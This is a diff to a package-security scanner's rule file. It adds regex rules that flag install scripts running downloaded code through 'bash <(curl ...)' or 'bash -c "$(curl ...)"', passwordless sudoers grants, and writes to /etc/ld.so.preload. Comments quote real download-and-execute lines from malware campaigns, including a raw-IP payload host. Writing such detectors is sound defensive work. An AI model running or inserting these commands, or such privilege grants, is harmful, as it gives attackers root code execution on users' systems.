@@ -2836,3 +2836,97 @@ pattern = 'source=[^\n]{0,200}https?://[0-9]{1,3}(\.[0-9]{1,3}){3}'
 points = 45
 description = "APKBUILD source= points at a raw IP address rather than a hostname"
 override_gate = false
+
+# --- Shell run on a download through process or command substitution ---
+# `bash <(curl -L URL)` runs the fetched script exactly as `curl URL | bash` does, but the pipe rules
+# (P-CURL-PIPE, P-INSTALL-PIPE-SHELL) look for `|` and never saw it. The live 398-package AUR typosquat
+# campaign (brave, dropbox, paru, yay, firefox) has, at the top level of its .install, run as root on
+# install: bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/...').
+# It reached a verdict only through the 45-point P-INSTALL-CURL. The shell must be the command (start
+# of line, or after ; & | ( { ` or a quote): `cat <(curl …)`, `gpg --verify <(curl …)` and
+# `done < <(curl …)` read the download as data. hook_only as for P-CURL-PIPE: in library source
+# (pypi, cargo, go, npm, …) the same text is an install hint or a detector's test vector.
+[[pkgbuild_analysis]]
+id = "P-PROC-SUB-EXEC"
+pattern = '''(?:^|[\s;&|({`"'])(?:(?:/usr)?/bin/(?:env\s+)?)?(?:bash|sh|zsh|dash|ksh|source|\.)\s+(?:-[A-Za-z]+\s+)*<\(\s*(?:curl|wget)\s'''
+points = 90
+description = "Shell runs a downloaded script through process substitution (bash <(curl ...))"
+override_gate = true
+hook_only = true
+hook_only_ecosystems = ["pypi", "cargo", "go", "packagist", "pubdev", "pub", "npm"]
+
+[[install_script_analysis]]
+id = "P-INSTALL-PROC-SUB-EXEC"
+pattern = '''(?:^|[\s;&|({`"'])(?:(?:/usr)?/bin/(?:env\s+)?)?(?:bash|sh|zsh|dash|ksh|source|\.)\s+(?:-[A-Za-z]+\s+)*<\(\s*(?:curl|wget)\s'''
+points = 90
+description = "Install script runs a downloaded script through process substitution (bash <(curl ...))"
+override_gate = true
+
+# `bash -c "$(curl -fsSL URL)"` and `eval "$(wget -qO- URL)"`: the same download-and-execute through
+# command substitution. It is the shape of the decoded cask-m/homebrew-install payload
+# (/bin/bash -c "$(curl -fsSL http://64.52.80.235/Socedes)").
+[[pkgbuild_analysis]]
+id = "P-CMD-SUB-EXEC"
+pattern = '''(?:^|[\s;&|({`"'])(?:(?:/usr)?/bin/(?:env\s+)?)?(?:(?:bash|sh|zsh|dash|ksh)\s+(?:-[A-Za-z]+\s+)*-[A-Za-z]*c|eval)\s+["']?\$\(\s*(?:curl|wget)\s'''
+points = 90
+description = "Shell runs a downloaded script through command substitution (bash -c \"$(curl ...)\")"
+override_gate = true
+hook_only = true
+hook_only_ecosystems = ["pypi", "cargo", "go", "packagist", "pubdev", "pub", "npm"]
+
+[[install_script_analysis]]
+id = "P-INSTALL-CMD-SUB-EXEC"
+pattern = '''(?:^|[\s;&|({`"'])(?:(?:/usr)?/bin/(?:env\s+)?)?(?:(?:bash|sh|zsh|dash|ksh)\s+(?:-[A-Za-z]+\s+)*-[A-Za-z]*c|eval)\s+["']?\$\(\s*(?:curl|wget)\s'''
+points = 90
+description = "Install script runs a downloaded script through command substitution (bash -c \"$(curl ...)\")"
+override_gate = true
+
+# --- Weak sudoers grants (weakness, not malware) ---
+# A NOPASSWD rule that also allows SETENV, a wildcard argument or a path under /tmp hands root to
+# whoever runs as that user: SETENV lets them set LD_PRELOAD or PATH, `rclone *` lets them name any
+# config, a /tmp path is theirs to replace. The audit reclassified these as vulnerabilities
+# (pluton-agent CWE-250 NOPASSWD SETENV rclone/restic *, tytus NOPASSWD on a /tmp path,
+# vpn-shroud NOPASSWD iptables/nft *), not malware. suppressSudoersLine keeps them off the
+# P-SUDOERS-MOD evidence rules.
+[[pkgbuild_analysis]]
+id = "P-SUDOERS-WEAK-GRANT"
+pattern = '''NOPASSWD\s*:[^\n]*(?:SETENV|\*|/tmp/)|SETENV\s*:[^\n]*NOPASSWD'''
+points = 50
+description = "sudoers rule grants passwordless sudo with SETENV, a wildcard or a /tmp path (privilege escalation for that user)"
+weakness = true
+cwe = "CWE-269"
+cvss = "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+
+[[install_script_analysis]]
+id = "P-INSTALL-SUDOERS-WEAK-GRANT"
+pattern = '''NOPASSWD\s*:[^\n]*(?:SETENV|\*|/tmp/)|SETENV\s*:[^\n]*NOPASSWD'''
+points = 50
+description = "Install script writes a sudoers rule granting passwordless sudo with SETENV, a wildcard or a /tmp path"
+weakness = true
+cwe = "CWE-269"
+cvss = "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+
+# --- /etc/ld.so.preload writes (weakness) ---
+# Adding a library to /etc/ld.so.preload loads it into every dynamically linked process on the
+# system, root's included (ATT&CK T1574.006). A rootkit does this; so does sundtek's TV-tuner
+# driver (`echo "/opt/lib/libmediaclient.so" >> /etc/ld.so.preload` in its .install), which the
+# audit reclassified rather than called malware. Recorded as a weakness so the system-wide
+# injection is reported without minting the driver. Only an append or overwrite: an echoed
+# message naming the file and a `sed -i` that removes the entry are not insertion.
+[[install_script_analysis]]
+id = "P-INSTALL-LD-SO-PRELOAD"
+pattern = '''(?:>>?\s*|\btee\s+(?:-a\s+)?)["']?/etc/ld\.so\.preload\b'''
+points = 50
+description = "Install script adds a library to /etc/ld.so.preload (loaded into every process)"
+weakness = true
+cwe = "CWE-829"
+cvss = "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
+
+[[pkgbuild_analysis]]
+id = "P-LD-SO-PRELOAD"
+pattern = '''(?:>>?\s*|\btee\s+(?:-a\s+)?|\binstall\s[^\n]*\s)["']?(?:\$\{?pkgdir\}?)?/etc/ld\.so\.preload\b'''
+points = 50
+description = "Recipe writes or ships /etc/ld.so.preload (a library loaded into every process)"
+weakness = true
+cwe = "CWE-829"
+cvss = "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
